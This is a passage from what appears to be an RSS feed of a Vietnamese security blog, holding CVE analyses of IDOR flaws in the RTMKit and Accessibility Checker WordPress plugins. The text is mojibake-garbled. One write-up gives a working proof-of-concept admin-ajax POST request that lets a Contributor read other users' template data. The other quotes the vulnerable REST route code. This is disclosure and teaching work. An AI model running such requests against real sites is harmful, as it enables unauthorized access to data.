1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Contributor&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;action=get_template_content&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;get_template_content() executed&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;check_ajax_referer passed&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Control template ID parameter&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post_meta(target_id, _elementor_data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Return template content&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o post b·∫±ng &lt;strong&gt;Elementor&lt;/strong&gt; v·ªõi &lt;strong&gt;Contributor+ user&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;B·∫Øt request b·∫±ng BurpSuite v√† l·∫•y gi√° tr·ªã nonce ƒë∆∞·ª£c tr·∫£ v·ªÅ:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script id=&amp;#34;rkit-library-script-js-extra&amp;#34;&amp;gt;&#xA;    var rkit_libs = {&amp;#34;logo_url&amp;#34;:&amp;#34;http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png&amp;#34;,&amp;#34;ajax_url&amp;#34;:&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;,&amp;#34;template_nonce&amp;#34;:&amp;#34;nonce_value&amp;#34;};&#xA;    //# sourceURL=rkit-library-script-js-extra&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request v·ªõi &lt;code&gt;template=id_of_other_post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: contributor_cookie&#xA;&#xA;action=get_template_content&amp;amp;wpnonce=bea52715a7&amp;amp;template=25&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; title=&#34;Administrator post content&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; data-sub-html=&#34;&lt;h2&gt;Administrator post&lt;/h2&gt;&lt;p&gt;Administrator post content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#39; alt=&#34;Administrator post&#34; height=&#34;799&#34; width=&#34;1412&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Administrator post content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;M·ªôt s·ªë Ajax kh√°c c≈©ng t·ªìn t·∫°i l·ªó h·ªïng n√†y&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_lib&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_envato_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_template_category&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64283 xu·∫•t ph√°t t·ª´ vi·ªác plugin ch·ªâ d·ª±a v√†o &lt;strong&gt;nonce&lt;/strong&gt; ƒë·ªÉ x√°c th·ª±c request AJAX m√† kh√¥ng th·ª±c hi·ªán &lt;strong&gt;ki·ªÉm tra quy·ªÅn truy c·∫≠p theo vai tr√≤ ng∆∞·ªùi d√πng&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p ng∆∞·ªùi d√πng c√≥ quy·ªÅn th·∫•p h∆°n (Contributor+) ki·ªÉm so√°t tham s·ªë &lt;code&gt;template&lt;/code&gt; v√† truy xu·∫•t d·ªØ li·ªáu &lt;code&gt;_elementor_data&lt;/code&gt; c·ªßa c√°c post kh√¥ng thu·ªôc quy·ªÅn s·ªü h·ªØu c·ªßa h·ªç. B·∫£n v√° v1.6.8 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch b·ªï sung ki·ªÉm tra quy·ªÅn qu·∫£n tr·ªã, ngƒÉn ch·∫∑n vi·ªác truy c·∫≠p tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonce &lt;strong&gt;kh√¥ng thay th·∫ø&lt;/strong&gt; cho ki·ªÉm so√°t quy·ªÅn truy c·∫≠p (authorization).&lt;/li&gt;&#xA;&lt;li&gt;AJAX action trong WordPress c·∫ßn &lt;strong&gt;ki·ªÉm tra capability ph√π h·ª£p&lt;/strong&gt;, kh√¥ng ch·ªâ ki·ªÉm tra ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;C√°c tham s·ªë ƒë·ªãnh danh ƒë·ªëi t∆∞·ª£ng (ID) do ng∆∞·ªùi d√πng ki·ªÉm so√°t c·∫ßn ƒë∆∞·ª£c &lt;strong&gt;r√†ng bu·ªôc quy·ªÅn truy c·∫≠p r√µ r√†ng&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR th∆∞·ªùng xu·∫•t hi·ªán trong c√°c logic AJAX b·ªã c·∫•u h√¨nh ki·ªÉm so√°t truy c·∫≠p kh√¥ng ƒë·∫ßy ƒë·ªß.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin &amp;lt;= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-57886 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</link>
      <pubDate>Mon, 22 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-22-cve-2025-57886/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;b·ªè qua c∆° ch·∫ø ph√¢n quy·ªÅn (Authorization Bypass) th√¥ng qua kh√≥a do ng∆∞·ªùi d√πng ki·ªÉm so√°t&lt;/strong&gt; trong plugin &lt;strong&gt;Equalize Digital Accessibility Checker&lt;/strong&gt; c·ªßa &lt;strong&gt;Equalize Digital&lt;/strong&gt; cho ph√©p khai th√°c vi·ªác &lt;strong&gt;c·∫•u h√¨nh sai c√°c m·ª©c ki·ªÉm so√°t truy c·∫≠p&lt;/strong&gt;. L·ªó h·ªïng n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; t·ª´ phi√™n b·∫£n &lt;strong&gt;kh√¥ng x√°c ƒë·ªãnh&lt;/strong&gt; ƒë·∫øn &lt;strong&gt;1.30.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-57886&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-57886&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.30.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.30.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/accessibility-checker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.1&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init_rest_routes() {&#xA;    $ns      = &amp;#39;accessibility-checker/&amp;#39;;&#xA;    $version = &amp;#39;v1&amp;#39;;&#xA;&#xA;    add_action(&#xA;        &amp;#39;rest_api_init&amp;#39;,&#xA;        function () use ( $ns, $version ) {&#xA;            register_rest_route(&#xA;                $ns . $version,&#xA;                &amp;#39;/post-scan-results/(?P&amp;lt;id&amp;gt;\d&amp;#43;)&amp;#39;,&#xA;                [&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; [ $this, &amp;#39;set_post_scan_results&amp;#39; ],&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;                        &amp;#39;id&amp;#39; =&amp;gt; [&#xA;                            &amp;#39;validate_callback&amp;#39; =&amp;gt; function ( $param ) {&#xA;                                return is_numeric( $param );&#xA;                            },&#xA;                        ],&#xA;                    ],&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                        return current_user_can( &amp;#39;edit_posts&amp;#39; );&#xA;                    },&#xA;                ]&#xA;            );&#xA;        }&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh√¨n v√†o logic c·ªßa ƒëo·∫°n code, ch√∫ng ta c√≥ th·ªÉ r√∫t ra m·ªôt s·ªë ƒëi·ªÉm quan tr·ªçng:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Namespace v√† route&lt;/strong&gt;&#xA;Endpoint ƒë∆∞·ª£c ƒë·∫∑t d∆∞·ªõi &lt;code&gt;accessibility-checker/v1&lt;/code&gt; v·ªõi route &lt;code&gt;/post-scan-results/{id}&lt;/code&gt;. Tham s·ªë &lt;code&gt;id&lt;/code&gt; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a l√† &lt;strong&gt;s·ªë&lt;/strong&gt;, nh·ªù regex &lt;code&gt;\d+&lt;/code&gt; v√† &lt;code&gt;validate_callback&lt;/code&gt;. ƒê√¢y l√† m·ªôt b∆∞·ªõc ki·ªÉm tra c∆° b·∫£n, nh∆∞ng ch∆∞a h·ªÅ ki·ªÉm tra xem &lt;code&gt;id&lt;/code&gt; c√≥ t·ªìn t·∫°i hay thu·ªôc post type n√†o.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ph∆∞∆°ng th·ª©c HTTP&lt;/strong&gt;&#xA;Route ch·ªâ ch·∫•p nh·∫≠n &lt;code&gt;POST&lt;/code&gt;, g·ª£i √Ω r·∫±ng ƒë√¢y l√† endpoint &lt;strong&gt;ghi ho·∫∑c c·∫≠p nh·∫≠t d·ªØ li·ªáu&lt;/strong&gt;, kh√¥ng ph·∫£i ch·ªâ ƒë·ªçc.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Ki·ªÉm tra quy·ªÅn&lt;/strong&gt;&#xA;&lt;code&gt;permission_callback&lt;/code&gt; ch·ªâ ki·ªÉm tra capability t·ªïng qu√°t &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+). Quy·∫øt ƒë·ªãnh cho ph√©p hay t·ª´ ch·ªëi request &lt;strong&gt;kh√¥ng d·ª±a v√†o post c·ª• th·ªÉ&lt;/strong&gt;, t·ª©c l√† &lt;strong&gt;user c√≥ quy·ªÅn t·ªïng qu√°t s·∫Ω ƒë∆∞·ª£c ph√©p thao t√°c v·ªõi b·∫•t k·ª≥ &lt;code&gt;id&lt;/code&gt; n√†o&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Callback x·ª≠ l√Ω&lt;/strong&gt;&#xA;N·∫øu v∆∞·ª£t qua permission, WordPress g·ªçi &lt;code&gt;set_post_scan_results&lt;/code&gt; v·ªõi &lt;code&gt;$id&lt;/code&gt; do client cung c·∫•p. T·∫°i ƒë√¢y, to√†n b·ªô logic x·ª≠ l√Ω d·ªØ li·ªáu ho√†n to√†n &lt;strong&gt;tin v√†o gi√° tr·ªã &lt;code&gt;id&lt;/code&gt; m√† client ki·ªÉm so√°t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function set_post_scan_results( $request ) {&#xA;    if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;A required parameter is missing.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    $post    = get_post( $post_id );&#xA;    if ( ! is_object( $post ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post is not valid.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_type  = get_post_type( $post );&#xA;    $post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;    if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post type is not set to be scanned.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $rules = edac_register_rules();&#xA;    $js_rule_ids = [];&#xA;    $combined_rule_ids = [];&#xA;    ...&#xA;&#xA;    try {&#xA;        do_action( &amp;#39;edac_before_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;&#xA;        $violations = $request[&amp;#39;violations&amp;#39;];&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 1, &amp;#39;js&amp;#39; );&#xA;&#xA;        if ( is_array( $violations ) &amp;amp;&amp;amp; count( $violations ) &amp;gt; 0 ) {&#xA;            foreach ( $violations as $violation ) {&#xA;                $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;                $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id;&#xA;                if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) {&#xA;                    ...&#xA;                    ( new Insert_Rule_Data() )-&amp;gt;insert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;                    ...&#xA;                }&#xA;            }&#xA;        }&#xA;&#xA;        do_action( &amp;#39;edac_after_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 2, &amp;#39;js&amp;#39; );&#xA;&#xA;        $metrics = $request[&amp;#39;densityMetrics&amp;#39;] ?? [ 0, 0 ];&#xA;        update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;&#xA;        ( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;        update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&#xA;&#xA;        do_action( &amp;#39;edac_validate_before_sending_rest_response&amp;#39;, $post_id, &amp;#39;js&amp;#39;, $request );&#xA;&#xA;        return new \WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;id&amp;#39; =&amp;gt; $post_id, &amp;#39;timestamp&amp;#39; =&amp;gt; time() ] );&#xA;&#xA;    } catch ( \Exception $ex ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; $ex-&amp;gt;getMessage() ], 500 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n request t·ª´ REST API v√† x·ª≠ l√Ω k·∫øt qu·∫£ qu√©t accessibility cho m·ªôt b√†i vi·∫øt. Lu·ªìng logic ch√≠nh 